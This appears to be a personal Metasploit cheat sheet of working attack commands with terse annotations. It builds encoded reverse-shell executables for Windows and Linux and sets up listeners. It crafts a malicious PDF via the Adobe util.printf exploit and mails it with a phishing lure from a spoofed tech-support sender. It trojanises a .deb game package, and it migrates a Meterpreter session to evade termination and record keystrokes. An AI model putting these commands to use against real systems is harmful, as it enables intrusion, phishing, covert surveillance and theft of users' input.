**Windows** (generic)
`msfvenom --list-options -p windows/shell/reverse_tcp `
check payload options for setup

`msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=eth0 LPORT=31337 -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/1.exe`
create it

within msfconsole
`use multi/handler`
to create the listener

`set payload windows/shell/reverse_tcp`
and the host:port

---

**Adobe Reader ‘util.printf()’ JavaScript Function Stack Buffer Overflow Vulnerability.** https://www.offensive-security.com/metasploit-unleashed/client-side-exploits/

`use exploit/windows/fileformat/adobe_utilprintf`
set up the reverse shell inside the pdf

`sendEmail -t itdept@victim.com -f techsupport@bestcomputers.com -s 192.168.8.131 -u Important Upgrade Instructions -a /tmp/BestComputers-UpgradeInstructions.pdf`
	Reading message body from STDIN because the '-m' option was not used.
	If you are manually typing in a message:
	  - First line must be received within 60 seconds.
	  - End manual input with a CTRL-D on its own line.
	
	IT Dept,
	
	We are sending this important file to all our customers. It contains very important instructions for upgrading and securing your software. Please read and let us know if you have any problems.
	
	Sincerely,
	
	Best Computers Tech Support
oh la la

---

**Keylogging!**
`meterpreter > ps`
get a list of processes

`meterpreter > run post/windows/manage/migrate `
move to another process to not get terminated

`meterpreter > sysinfo`
system info

`meterpreter > use priv`
no idea

`meterpreter > run post/windows/capture/keylog_recorder `
key logger!

---

**Win pass the hash login w/out password**
https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/

---

**Linux**
`msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=192.168.1.101 LPORT=443 -b "\x00" -f elf -o /tmp/evil/work/usr/games/freesweep_scores`
build the connect file (see tutorial to attach to a .deb package https://www.offensive-security.com/metasploit-unleashed/binary-linux-trojan/)

`msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/x86/shell/reverse_tcp; set LHOST 192.168.1.101; set LPORT 443; run; exit -y"`
setup listener


